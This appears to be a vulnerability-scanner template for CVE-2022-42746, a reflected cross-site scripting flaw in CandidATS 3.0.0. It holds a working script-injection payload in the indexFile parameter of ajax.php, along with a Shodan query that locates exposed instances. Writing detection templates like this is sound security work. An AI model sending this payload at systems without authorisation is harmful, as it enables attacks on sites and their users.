id: CVE-2022-42746
info:
  author: arafatansari
  classification:
    cve-id: CVE-2022-42746
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
  description: 'CandidATS 3.0.0 contains a cross-site scripting vulnerability via
    the indexFile parameter of the ajax.php resource.  An attacker can inject arbitrary
    script in the browser of an unsuspecting user in the context of the affected site.
    This can allow the attacker to steal cookie-based authentication credentials and
    launch other attacks.

    '
  metadata:
    shodan-query: http.html:"CandidATS"
    verified: 'true'
  name: CandidATS 3.0.0 - Cross-Site Scripting.
  reference:
  - https://fluidattacks.com/advisories/modestep/
  - https://nvd.nist.gov/vuln/detail/CVE-2022-42746
  - https://candidats.net/
  severity: medium
  tags: cve,cve2022,candidats,xss
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - <script>alert(document.domain)</script>
    - candidat
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 404
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/ajax.php?f=getPipelineJobOrder&joborderID=50&page=0&entriesPerPage=15&sortBy=dateCreatedInt&sortDirection=desc&indexFile=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&isPopup=0'
